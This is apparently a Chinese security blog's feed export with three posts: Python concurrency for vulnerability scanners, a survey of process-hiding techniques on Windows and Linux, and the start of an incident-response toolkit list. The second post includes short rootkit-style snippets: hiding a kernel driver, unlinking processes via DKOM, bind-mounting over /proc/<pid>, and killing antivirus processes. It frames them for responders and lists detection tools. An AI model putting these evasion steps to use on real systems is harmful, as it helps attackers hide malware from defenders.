<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">seed</span><span class="o">=</span><span class="p">[</span><span class="s">"a"</span><span class="p">,</span><span class="s">"b"</span><span class="p">,</span><span class="s">"c"</span><span class="p">]</span>
    <span class="n">start1</span><span class="o">=</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
    <span class="k">for</span> <span class="n">each</span> <span class="ow">in</span> <span class="n">seed</span><span class="p">:</span>
        <span class="n">sayhello</span><span class="p">(</span><span class="n">each</span><span class="p">)</span>
    <span class="n">end1</span><span class="o">=</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"time1: "</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">end1</span><span class="o">-</span><span class="n">start1</span><span class="p">))</span>
    <span class="c">#submit提交</span>
    <span class="n">start2</span><span class="o">=</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
    <span class="k">with</span> <span class="n">ThreadPoolExecutor</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="k">as</span> <span class="n">executor</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">each</span> <span class="ow">in</span> <span class="n">seed</span><span class="p">:</span>
            <span class="n">executor</span><span class="o">.</span><span class="n">submit</span><span class="p">(</span><span class="n">sayhello</span><span class="p">,</span><span class="n">each</span><span class="p">)</span>
    <span class="n">end2</span><span class="o">=</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"time2: "</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">end2</span><span class="o">-</span><span class="n">start2</span><span class="p">))</span>
    <span class="c">#map提交</span>
    <span class="n">start3</span><span class="o">=</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
    <span class="k">with</span> <span class="n">ThreadPoolExecutor</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="k">as</span> <span class="n">executor1</span><span class="p">:</span>
        <span class="n">executor1</span><span class="o">.</span><span class="nb">map</span><span class="p">(</span><span class="n">sayhello</span><span class="p">,</span><span class="n">seed</span><span class="p">)</span>
    <span class="n">end3</span><span class="o">=</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"time3: "</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">end3</span><span class="o">-</span><span class="n">start3</span><span class="p">))</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>

</code></pre>
</div>

<p>我们可以看看上面的代码注释，其中submit和map的区别在于：</p>

<blockquote>
  <ol>
    <li>map可以保证输出的顺序, submit输出的顺序是乱的。</li>
  </ol>
</blockquote>

<blockquote>
  <ol>
    <li>如果你要提交的任务的函数是一样的，就可以简化成map。但是假如提交的任务函数是不一样的，或者执行的过程之可能出现异常（使用map执行过程中发现问题会直接抛出错误）就要用到submit。</li>
  </ol>
</blockquote>

<blockquote>
  <ol>
    <li>submit和map的参数是不同的，submit每次都需要提交一个目标函数和对应的参数，map只需要提交一次目标函数，目标函数的参数放在一个迭代器（列表，字典）里就可以。</li>
  </ol>
</blockquote>

<h3 id="协程">协程</h3>

<p>协程算是一种用户级别的轻量级线程，调度较线程会麻烦一些，但因为开销减少提升了性能。</p>

<ul>
  <li>gevent</li>
</ul>

<p>这个就是熟面孔了，许多经典爬虫都会用到这个库，在linux下贼好用的。不过因为依赖库的问题，让它在win下总是出现greenlet等库的版本和依赖问题。</p>

<p>不过比之线程池的threadpool，这个不加锁时也不用担心乱序问题。</p>

<div class="highlighter-rouge"><pre class="highlight"><code>from gevent import monkey
monkey.patch_all()
from gevent.pool import Pool
import requestss

def detect(url):
    try:
        r = requests.get(url,  headers= headers ,timeout = timeout ,verify = False)
    except Exception,e:
        return

pool = Pool(20)#协程数
pool.map(detect, urls)
[pool.putRequest(req) for req in reqs]
pool.wait()

</code></pre>
</div>

<ul>
  <li>其他协程库</li>
</ul>

<p>另外，其他实现协程的库还是蛮多的，这里不方便列举，有兴趣的朋友可以搜搜。</p>

<ol>
  <li>asyncio</li>
  <li>tornado</li>
</ol>

<h3 id="进程">进程</h3>

<p>进程间的切换，会消耗较多的资源和时间，一般会配合多线程/协程使用，叠加对任务进行分发。</p>

<p>下面我们来看几个案例：</p>

<h4 id="多进程">多进程</h4>

<ul>
  <li>fork</li>
</ul>

<p>教科书式的的案例，曾收录在不少经典编程书籍里：</p>
<div class="highlighter-rouge"><pre class="highlight"><code><span class="c">#!/bin/env python</span>
<span class="kn">import</span> <span class="nn">os</span>

<span class="k">print</span> <span class="s">'Process (</span><span class="si">%</span><span class="s">s) start...'</span> <span class="o">%</span> <span class="n">os</span><span class="o">.</span><span class="n">getpid</span><span class="p">()</span>
<span class="n">pid</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">fork</span><span class="p">()</span>
<span class="k">if</span> <span class="n">pid</span><span class="o">==</span><span class="mi">0</span><span class="p">:</span>
    <span class="k">print</span> <span class="s">'I am child process (</span><span class="si">%</span><span class="s">s) and my parent is </span><span class="si">%</span><span class="s">s.'</span> <span class="o">%</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">getpid</span><span class="p">(),</span> <span class="n">os</span><span class="o">.</span><span class="n">getppid</span><span class="p">())</span>
    <span class="n">os</span><span class="o">.</span><span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="k">print</span> <span class="s">'I (</span><span class="si">%</span><span class="s">s) just created a child process (</span><span class="si">%</span><span class="s">s).'</span> <span class="o">%</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">getpid</span><span class="p">(),</span> <span class="n">pid</span><span class="p">)</span>
</code></pre>
</div>

<ul>
  <li>multiprocessing的多进程</li>
</ul>

<div class="highlighter-rouge"><pre class="highlight"><code><span class="c">#!/bin/env python</span>
<span class="kn">from</span> <span class="nn">multiprocessing</span> <span class="kn">import</span> <span class="n">Process</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">time</span>

<span class="k">def</span> <span class="nf">run_proc</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
    <span class="k">print</span> <span class="s">'Run child process </span><span class="si">%</span><span class="s">s (</span><span class="si">%</span><span class="s">s)...'</span> <span class="o">%</span> <span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">getpid</span><span class="p">())</span>

<span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">'__main__'</span><span class="p">:</span>
    <span class="k">print</span> <span class="s">'Parent process </span><span class="si">%</span><span class="s">s.'</span> <span class="o">%</span> <span class="n">os</span><span class="o">.</span><span class="n">getpid</span><span class="p">()</span>
    <span class="n">processes</span> <span class="o">=</span> <span class="nb">list</span><span class="p">()</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">Process</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">run_proc</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="s">'test'</span><span class="p">,))</span>
        <span class="k">print</span> <span class="s">'Process will start.'</span>
        <span class="n">p</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
        <span class="n">processes</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
    
    <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">processes</span><span class="p">:</span>
        <span class="n">p</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>
    <span class="k">print</span> <span class="s">'Process end.'</span>

</code></pre>
</div>

<ul>
  <li>multiprocessing下的多线程</li>
</ul>

<p>在multiprocessing下也有个多线程模块,通过async_result.get()可以获取结果。</p>

<p>multiprocessing也能实现多线程，它有两个多线程的入口，一个是 dummy Pool：</p>

<div class="highlighter-rouge"><pre class="highlight"><code># -*- coding: utf-8 -*-
# from multiprocessing import Pool 多进程
from multiprocessing.dummy import Pool as ThreadPool #多线程
import time
import urllib2
 
urls = [
    'http://www.python.org', 
    'http://www.python.org/about/',
    'http://www.onlamp.com/pub/a/python/2003/04/17/metaclasses.html',
    ]
 
# 单线程
start = time.time()
results = map(urllib2.urlopen, urls)
print 'Normal:', time.time() - start
 
# 多线程
start2 = time.time()
# 开4个 worker，没有参数时默认是 cpu 的核心数
pool = ThreadPool(4)
# 在线程中执行 urllib2.urlopen(url) 并返回执行结果
results2 = pool.map(urllib2.urlopen, urls)
pool.close()
pool.join()
print 'Thread Pool:', time.time() - start2

</code></pre>
</div>

<p>另一个是pool.ThreadPool：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>from multiprocessing.pool import ThreadPool
 
def foo(bar, baz):
  print 'hello {0}'.format(bar)
  return 'foo' + baz
 
pool = ThreadPool(processes=1)
 
async_result = pool.apply_async(foo, ('xiaorui.cc', 'foo',))

return_val = async_result.get()
</code></pre>
</div>

<h4 id="进程池">进程池</h4>

<ul>
  <li>multiprocessing进程池</li>
</ul>

<p>注意下面代码的注释，apply_async和apply函数，前者是非阻塞的，后者是阻塞。可以看出运行时间相差的倍数正是进程池数量。</p>

<div class="highlighter-rouge"><pre class="highlight"><code>import multiprocessing
import time

def func(msg):
    print "msg:", msg
    time.sleep(3)
    print "end"
    return "done" + msg

if __name__ == "__main__":
    pool = multiprocessing.Pool(processes=4)
    result = []
    for i in xrange(3):
        msg = "hello %d" %(i)
        #result.append(pool.apply(func, (msg, )))
		result.append(pool.apply_async(func, (msg, )))
    pool.close()
    pool.join()
    for res in result:
        print ":::", res.get()
    print "Sub-process(es) done."
</code></pre>
</div>

<h3 id="封装库">封装库</h3>

<p>网上还有一些通过封装多进程、多线程、队列组合成的第三方库，也能达到比较好的效果，这种库对于细节的优化较好。</p>

<p>下面是某个第三方库的代码：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>#coding=utf-8

import threading
import Queue

from billiard.dummy import DummyProcess

class work(DummyProcess):
    def __init__(self, workQueue, result_queue, timeout=5, **kwargs):
        self.timeout = timeout
        self.result_queue = result_queue
        self.isRunning = False
        self.workQueue = workQueue
        DummyProcess.__init__(self, kwargs=kwargs)


    def stop(self):
        self.isRunning = False

    def run(self):
        self.isRunning = True
        while self.isRunning:
            try:
                func, args, kwargs = self.workQueue.get(timeout=self.timeout)
                result = apply(func, *args, **kwargs)
                self.workQueue.task_done()
                self.result_queue.put(result, False)
            except Queue.Empty:
                self.isRunning = False
            except:
                pass

class ThreadPool:
    def __init__(self, num_of_threads=10):
        self.workQueue = Queue.Queue()
        self.result_queue = Queue.Queue()
        self.threads = []

        for i in range(num_of_threads):
            thread = work(self.workQueue, self.result_queue)
            self.threads.append(thread)

    def add_job(self, fun, *args, **kwargs):
        self.workQueue.put((fun, args, kwargs))
    
    def get_result(self):
        results = []
        try:
            while True:
                result = self.result_queue.get(block=False)
                results.append(result)
        except Exception,e:
            print str(e)
        finally:
            return results

    def start(self):
        try:
            for t in self.threads:
                t.start()
        except:
            self.stop()

    def stop(self):
        for t in self.threads:
            t.stop()

    def wait_for_complete(self):
        try:
            for t in self.threads:
                while t.isAlive():
                    t.join(10)

        except KeyboardInterrupt:
            self.stop()
            print


if __name__ == "__main__":
    tp = ThreadPool(20)
    for line in open('target.txt').readlines():
        evil = Evil_Class(line)
        tp.add_job(evil.run)
    tp.start()
    try:
        tp.wait_for_complete()
        resp = tp.get_result()
    except KeyboardInterrupt:
        tp.stop()


</code></pre>
</div>

<h3 id="分布式任务">分布式任务</h3>

<p>对于分布式任务的话，配置起来会比较麻烦。比如你就一台PC或者破VPS，还想搞多节点分布式任务，显然吃饱了撑着没事干。</p>

<p>分布式的优点的话，主要在于其可扩展性，理论上只要消息中间件和容错机制足够稳健，带宽足够高，就能最大化提升扫描器的性能。</p>

<ul>
  <li>celery</li>
</ul>

<p>celery是一个国外的分布式调度框架，在扫描器方面，我们可以采用几种方案：</p>

<blockquote>
  <ol>
    <li>单机器 + 多节点 + 线/进程池</li>
    <li>多机器 + 多节点 + 线/进程池</li>
    <li>多机器 + 多节点</li>
  </ol>
</blockquote>

<p>前两条对扫描器性能提升确实是有的，但如果个别网络任务如果耗时较长的话，会持续占用进而耗尽节点的资源。
即使每条任务里，我们都会尽可能提升进程/线程数，但如果其中仍然包含有多级网络任务调用，那么扫描的速率也不会有太大的提升。因为除了机器资源以外，扫描器还会受带宽、网卡出口等其他因素的影响。</p>

<p>如果我们遵循第三条，最大化利用celery节点运行任务，将所有线/进程池尽可能替换，则会是另一个场景。
当每一个插件或者fuzz脚本，都作为单条任务去运行时，容错机制会及时结束掉每一个失败/超时的任务。在我们做好中间件和存储的灾备机制的前提下，扫描器将会变得更加稳健。</p>

<ul>
  <li>bugscan</li>
</ul>

<p>当然，业内也有小伙伴做出了基于rpc通信的异步任务管理框架，如bugscan。</p>

<p>其节点有三个核心：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>Service: rpc client, 负责与server通信, 获取任务插件，发送报告等操作。
Task_Manager: 任务管理器, 执行添加，删除任务的操作。
Task: 获取插件，执行任务，输出报告。
</code></pre>
</div>

<p>其运作的大概流程，这里就直接复制别人的分析报告了：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>无限循环 -&gt; service 获取任务列表 -&gt; 是否有待执行的任务 -&gt; 发送至 task_manager -&gt; 添加任务 -&gt; 调用 task -&gt; task 执行任务 -&gt; service 设置任务状态 -&gt; 是否返回报告 -&gt; service 发送报告 -&gt; 是否有待停止的任务 -&gt; 发送至 task_manager -&gt; 删除任务 -&gt; 调用 task -&gt; task 停止任务 -&gt; service 设置任务状态 -&gt; 无限循环
</code></pre>
</div>

<p>有兴趣的朋友可以看看原文，这是关于bugscan的一篇详细分析：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>https://www.chabug.org/tools/553.html
</code></pre>
</div>

<ul>
  <li>多种其他异步任务框架</li>
</ul>

<p>相似的框架还是蛮多的，就不一一列举了。</p>

<ol>
  <li>dramatiq</li>
  <li>sidekiq</li>
  <li>huey</li>
  <li>thriftpy</li>
</ol>

<h3 id="结语">结语</h3>

<p>总而言之，只要我们合理利用可以加速的库，可以更好地打造我们的扫描器。本文聊的内容比较基础，接下来的文章里，笔者打算通过细分领域，重点拿经典项目的案例进行剖析。</p>

<h3 id="参考文章">参考文章</h3>

<p><a href="https://www.cnblogs.com/xiaozi/p/6182990.html">python线程池（threadpool）模块使用笔记</a></p>

<p><a href="https://www.cnblogs.com/zhang293/p/7954353.html">多种方法实现 python 线程池</a></p>

<p><a href="http://xiaorui.cc/2015/11/03/%E7%90%86%E8%A7%A3python%E7%9A%84multiprocessing-pool-threadpool%E5%A4%9A%E7%BA%BF%E7%A8%8B/">理解python的multiprocessing.pool threadpool多线程</a></p>

<p><a href="https://blog.csdn.net/ns2250225/article/details/48755741">使用 multiprocessing.dummy 执行多线程任务</a></p>

<p><a href="https://www.cnblogs.com/lxmhhy/p/6052167.html">python 多进程使用总结</a></p>

<p><a href="https://www.cnblogs.com/PrettyTom/p/6582357.html">Python的多进程</a></p>

<p><a href="https://www.chabug.org/tools/553.html">[X1r0z]模拟bugscan node的通信机制及在线体验
</a></p>

]]></content>
      <categories>
        
          <category> scanner </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[浅谈进程隐藏之术]]></title>
      <url>/cert/2018/07/04/hide-process/</url>
      <content type="html"><![CDATA[<p>
	<span style="color:#00B050;"><strong>前段时间遇到了一些【进程隐藏】相关的应急事件，故此心生一念，对网上一些资料和部分个人经验做了总结，以飨众人。</strong></span>
</p>

<h3 id="windows进程隐藏">windows进程隐藏</h3>

<h4 id="基于系统服务的进程隐藏技术">基于系统服务的进程隐藏技术</h4>

<p>在WIN 9X系列操作系统中, 系统进程列表中不能看到任何系统服务进程, 因此只需要将指定进程注册为系统服务就能够使该进程从系统进程列表中隐形。</p>

<p>在WIN 9X下用RegisterServiceProcess函数隐藏进程，NT架构下用不了 即win2000和xp等什么的用不了此方法。</p>

<p>替换tasklist、ps、top
https://blog.csdn.net/qq_27446553/article/details/54591099
windows高版本内核难以进行真正的进程隐藏，除非编写底层驱动。
在进程LoadLibrary某个DLL文件后，这个DLL是不可以被删除的，但是可以改名和移动位置（当然，就算移动了位置也不可以删除它），所以代码中可以用MoveFile移动到某个角落去。
这样，DLL就从原来的位置消失了，而新位置在资源管理器中又无法访问到，达到了简单隐藏DLL的目的。</p>

<div class="highlighter-rouge"><pre class="highlight"><code>CreateDirectory('d:\test\....\', nil);
MoveFile('D:\test\Hack.dll', 'd:\test\....\Hack.dll');
</code></pre>
</div>

<h4 id="基于api-hook的进程隐藏技术">基于API HOOK的进程隐藏技术</h4>

<p>API HOOK指的是通过特殊的编程手段截获WINDOWS系统调用的API函数,并将其丢弃或者进行替换。 通过API
HOOK编程方法,截获系统遍历进程函数并对其进行替换,可以实现对任意进程的隐藏。</p>

<h4 id="基于-dll-的进程隐藏技术远程注入dll技术">基于 DLL 的进程隐藏技术:远程注入Dll技术</h4>

<p>先编写一个API的DLL，将它远程注入进程，写入远程进程的内存地址空间，并建立远程线程执行。</p>

<p>不触发PG（patchguard），又能隐藏驱动：
当驱动加载时 会将驱动信息加入那个链表，可以直接阻止这个加入的过程。
“MiProcessLoaderEntry”，这个函数将驱动信息加入链表和移除链表：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>调用MiProcessLoaderEntry(pDriverObject-&gt;DriverSection, 0);
PCHunter显示为红色~

能不能完全隐藏?
pTargetDriverObject-&gt;DriverSection = NULL;

// 破坏驱动对象特征
pTargetDriverObject-&gt;DriverStart = NULL;
pTargetDriverObject-&gt;DriverSize = NULL;
pTargetDriverObject-&gt;DriverUnload = NULL;
pTargetDriverObject-&gt;DriverInit = NULL;
pTargetDriverObject-&gt;DeviceObject = NULL;
</code></pre>
</div>

<h4 id="基于远程线程注入代码的进程隐藏技术">基于远程线程注入代码的进程隐藏技术</h4>

<p>这种方法与远程线程注入DLL的原理一样,都是通过在某进程中创建远程线程来共享该进程的内存空间。</p>

<p>所不同的是,远程线程注入代码通过直接拷贝程序代码到某进程的内存空间来达到注入的目的。</p>

<p>因为程序代码存在于内存中,不仅进程列表中无法检测,即使遍历进程加载的内存模块也无法找到被隐藏程序的踪迹。</p>

<h4 id="rootkit方式">Rootkit方式</h4>

<p>Intel CPU 有4 个特权级别： Ring 0， Ring 1， Ring 2， Ring 3。Windows 只使用了其中的 Ring  0 和  Ring  3 两个级别。</p>

<p>操作系统分为内核和外壳两部分：内核运行在Ring0级，通常称为核心态（或内核态），用于实现最底层的管理功能，在内核态可以访问系统数据和硬件，包括处理机调度、内存管理、设备管理、文件管理等；外壳运行在 Ring 3级，通常称为用户态，是基于内核提供的交互功能而存在的界面，它负责指令传递和解释。通常情况下，用户态的应用程序没有权限访问核心态的地址空间。</p>

<p>Rootkit 是攻击者用来隐藏自己的踪迹和保留 root 访问权限的工具，它能使攻击者一直保持对目标机器的访问，以实施对目标计算机的控制[1]。从 Rootkit 运行的环境来看，可将
其分为用户级 Rootkit 和内核级 Rootkit。
用户态下，应用程序会调用 Win32 子系统动态库（包括Kernel32.dll， User32.dll， Gdi32.dll等）提供的Win32 API函数，它们是Windows提供给应用程序与操作系统的接口，运行在Ring3级。用户级 Rootkit 通常就是通过拦截 Win32 API，建立系统钩子，插入自己的代码，从而控制检测工具对进程或服务的遍历调用，实现隐藏功能。</p>

<p>内核级Rootkit 是指利用驱动程序技术或其它相关技术进入Windows 操作系统内核，通过对 Windows 操作系统内核相关的数据结构或对象进行篡改，以实现隐藏功能。</p>

<p>由于Rootkit运行在Ring0级别，甚至进入内核空间，因而可以对内核指令进行修改，而用户级检测却无法发现内核操作被拦
截。
下面介绍两种使用Rootkit技术来实现进程隐藏的方法。注册表来实现启动,因而易于被检测出来。显然,要增强进程的隐蔽性,关键在于增强加载程序文件的隐藏性。</p>

<ul>
  <li>SSDT Hook</li>
</ul>

<p>参考资料：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>进程隐藏与进程保护（SSDT Hook 实现）（一）
http://www.cnblogs.com/zmlctt/p/3979105.html

进程隐藏与进程保护（SSDT Hook 实现）（二）
https://www.cnblogs.com/zmlctt/p/3979108.html

进程隐藏与进程保护（SSDT Hook 实现）（三）
http://www.cnblogs.com/BoyXiao/archive/2011/09/05/2168115.html
</code></pre>
</div>

<ul>
  <li>DKOM（Direct Kernel Object Manipulation，直接内核对象操作）</li>
</ul>

<div class="highlighter-rouge"><pre class="highlight"><code>使用DKOM方法进行进程隐藏。在Windows操作系统中，系统会为每一个活动进程创建一个进程对象EPROCESS，为进程中的每一个线程创建一个线程对象 ETHREAD。

在 EPROCESS 进程结构中有个双向链表 LIST_ENTRY，LIST_ENTRY结构中有FLINK 和BLINK 两个成员指针，分别指向当前进程的前驱进程和后继进程。

如果要隐藏当前进程，只需把当前进程的前驱进程的BLINK 修改为当前进程的BLINK，再把当前进程的后继进程的FLINK修改为当前进程的FLINK。
</code></pre>
</div>

<ul>
  <li>关于断链隐藏进程</li>
</ul>

<p>Windows系统中的所有进程通过其ActiveProcessLinks结构中的指针来引用。它们构成了诸如taskmgr.exe（任务管理器）或某些SysInternals（例如procexp.exe）等工具使用的双链表。</p>

<p>DKOM技术【直接内核对象操纵（Direct Kernel Object Manipulation）】隐藏了一个取消链接它自己的ActiveProcessLinks的进程，并将“前一个”和“下一个”进程直接相互链接。
事实上，许多监控/系统工具（例如SysInternals Microsoft套件）都是基于双链表的进程枚举。</p>

<p>不过断链隐藏进程，容易蓝屏，貌似也过不了pg。</p>

<h3 id="linux进程隐藏">Linux进程隐藏</h3>

<ul>
  <li>
    <p>一种简单的方法：系统启动时会依据 /etc/fstab 文件内容来挂载分区，在 proc 分区挂载参数中加入 hidepid=2 参数后，登陆系统的用户只能查看到当前用户启动的进程的信息。也就是说， tomcat 用户只能看到属于 tomcat 用户进程的信息。</p>
  </li>
  <li>
    <p>在内核中新增两个信号，当进程向内核发出 hide 信号时，内核将不会为该进程在 /proc 目录下生成对应的目录，从而也就从底层铲除了进程的信息，即使黑客获得了 root 权限也无法通过常规手段察觉到蛛丝马迹。除此之外，新增的unhide信号作用恰好与 hide 信号相反。</p>
  </li>
  <li>
    <p>对其他用户隐藏</p>
  </li>
</ul>

<p>如果你使用的linux kernel(内核)是3.2以上的版本(或者使用的RHEL/CentOS是6.5以上的版本)，你就可以对其他用户隐藏进程。
只有root用户可以看到所有的进程，而非root用户，只能看到属于自己的进程信息。你所需要做的仅仅是开启linux kernel加固选项 “hidepid “来重新挂载 /proc文件系统。</p>

<div class="highlighter-rouge"><pre class="highlight"><code>https://www.jb51.net/LINUXjishu/347787.html
</code></pre>
</div>

<ul>
  <li>linux下根据进程名称隐藏进程的PID</li>
</ul>

<ol>
  <li>
    <p>把要隐藏的进程PID设置为0，因为系统默认是不显示PID为0的进程，不过缺陷比较大。
其核心思想就是把task-&gt;pid变成0，就成了0号进程。而在ps，top命令中，是不显示0号进程的相关信息。这么一来，在/proc/文件夹下就不会有该进程的相关信息了。</p>
  </li>
  <li>
    <p>修改系统调用sys_getdents（）。</p>
  </li>
</ol>

<div class="highlighter-rouge"><pre class="highlight"><code>http://blog.chinaunix.net/uid-26585427-id-5077452.html
</code></pre>
</div>

<ol>
  <li>另外，还有一种比较简便的方法，就是把int main(int argc, char*argv[])中的参数变成0，那么就在单纯的ps命令中就不会显示进程相关信息，但是/proc/文件夹下，还会存在该进程的相关信息。</li>
</ol>

<div class="highlighter-rouge"><pre class="highlight"><code>https://blog.csdn.net/xqhrs232/article/details/51906206
</code></pre>
</div>

<ul>
  <li>遍历PspCidTable表检测隐藏进程</li>
</ul>

<div class="highlighter-rouge"><pre class="highlight"><code>https://www.cnblogs.com/kuangke/p/5761615.html
</code></pre>
</div>

<ul>
  <li>部分补充说明</li>
</ul>

<p>在变更文件里可以看到一些挖矿程序，同时 /etc/ld.so.preload 文件的变更需要引起注意，这里涉及到 Linux 动态链接库预加载机制，是一种常用的进程隐藏方法，而 top 等命令都是受这个机制影响的。</p>

<p>可以看看其中有没有包含可疑的so文件，然后记录后去掉。</p>
<div class="highlighter-rouge"><pre class="highlight"><code>注意
/etc/rc.d/init.d/network
/etc/resolv.conf

cat /etc/ld.so.preload
top 查看pid
ls  -lh /proc/pid号
得到相关文件位置后进行清理
</code></pre>
</div>

<p>隐藏进程，会出现proc下面大小异常：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>cat /pro/$$/mountinfo 
cat /proc/mounts 
mount
以上三个等价，可靠性不同。

$$ 表示当前shell进程的进程ID

#处理后可以瞒过直接mount
cp /etc/mtab .
mount –bind /bin /proc/[pid]
mv . /etc/mtab

#这样可以进行隐藏
mount –bind /tmp/empty /proc/2694
</code></pre>
</div>

<h3 id="windows工具检查">Windows工具检查</h3>

<ul>
  <li>Winpmem内存转储【配合Volatility进行内存取证】</li>
  <li>冰刃</li>
  <li>process explorer</li>
  <li>Filemon：查看进程和文件对应</li>
  <li>Regmon：查看进程和注册表对应</li>
  <li>PC Hunter(xuetr) 可查看硬盘上隐藏的文件</li>
</ul>

<h4 id="手动杀进程">手动杀进程</h4>

<p>非常古老的pskill</p>
<div class="highlighter-rouge"><pre class="highlight"><code>pskill $PID
</code></pre>
</div>

<p>可以用它结束一些常见的杀毒软件进程，使用方法如下：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>c:\&gt; ProcessHacker.exe -c -ctype process -cobject $PID-Number -caction terminate
</code></pre>
</div>

<p>也是暂停进程的运行，如下：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>c:\&gt; ProcessHacker.exe -c -ctype process -cobject $PID-Number –caction suspend
</code></pre>
</div>

<p>wmic：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>wmic process where caption="qq.exe" delete
wmic process where handle=10000 delete
</code></pre>
</div>

<p>TASKKILL：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>TASKKILL /S system /F /IM notepad.exe /T
TASKKILL /PID 1230 /PID 1241 /PID 1253 /T
TASKKILL /F /IM QQ.exe
</code></pre>
</div>

<p>ntsd：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>ntsd -c q -p pid
</code></pre>
</div>

<h3 id="linux下工具检查">Linux下工具检查：</h3>

<ul>
  <li>暴力枚举进程
    <div class="highlighter-rouge"><pre class="highlight"><code>通过PsLookupProcessByProcessId获得EPROCESS
通过ZwQuerySystemInformation
通过进程活动连来枚举
</code></pre>
    </div>
  </li>
  <li>
    <p>hkrookit</p>
  </li>
  <li>
    <p>rkhunter</p>

    <p>具体用法，请查看：<a href="/pentest/2018/06/25/security-emergency/">《信安应急响应手册
》</a>。</p>
  </li>
  <li>偶然发现的小工具</li>
</ul>

<p>可检测通过Hook vfs 函数来隐藏的进程。</p>
<div class="highlighter-rouge"><pre class="highlight"><code>https://security.tencent.com/index.php/opensource/detail/16
</code></pre>
</div>

<ul>
  <li>Volatility：
    <div class="highlighter-rouge"><pre class="highlight"><code>pslist – 通过检查双链表来检测进程
pstree – 使用了相同技术，只是显示有小小的差别
psscan – 在内存中扫描_POOL_HEADER结构（内存页池）以识别相关进程
psxview – 几种技术的组合：
pslist：如上所述
psscan：如上所述
thrdproc：线程扫描，检索调度程序使用的_KTHREAD列表（不能在不中断进程执行的情况下修改它），然后搜索相关的_EPROCESS对象。
pspcid
csrss：csrss.exe进程保留着可以在其内存中检索到的进程的独立列表。
session
deskthrd
</code></pre>
    </div>
  </li>
</ul>

<h3 id="尾声">尾声</h3>

<p>需要强调的是，攻防都是相对的，技术是在进步的，工具需要配合手工才能变成神器。</p>

<p>以后在实践中遇到新东西，或者在其他资料站看到实用的内容，后面会继续给大家更新。</p>
]]></content>
      <categories>
        
          <category> cert </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[信安应急响应手册]]></title>
      <url>/pentest/2018/06/25/security-emergency/</url>
      <content type="html"><![CDATA[<p>
	<span style="color:#DAA520;"><strong>在我们工作过程中，难免会遇到一些需要应急响应的事件。在紧急情况下，某些平时的苦工可能会帮助我们简化流程。这里做下应急方面的笔记，列出一些实用的小技巧。</strong></span>
</p>

<h3 id="应急工具包">应急工具包</h3>

<h4 id="tools-for-windows">Tools for windows</h4>

<ul>
  <li>Logparser</li>
  <li>wireshark</li>
  <li>WSExplorer</li>
  <li>冰刃</li>
  <li>process explorer</li>
  <li>winsyscheck</li>
  <li>PC Hunter(xuetr) 可查看硬盘上隐藏的文件</li>
  <li>D盾/360网站卫士/安全狗</li>
  <li>Filemon：查看进程和文件对应</li>
  <li>Regmon：查看进程和注册表对应</li>
  <li>Rootkit Unhooker：Hook检测</li>
  <li>Rootkit Revelaer：rootkit检测</li>
  <li>LP_Check工具检查: 找出影子管理员和克隆账号</li>
  <li>Autoruns工具： 查看启动项</li>
  <li>bitsadmin /list/allusers/verbose【好像不大好使】</li>
</ul>

<h4 id="tools-for-linux">Tools for linux</h4>

<ul>
  <li>chkrookit</li>
  <li>rkhunter</li>
  <li>tshark</li>
  <li>shellpub(河马)</li>
  <li>Auditd【linux自带审计】</li>
</ul>

<p>简单用法：</p>

<p>1、chkrootkit</p>

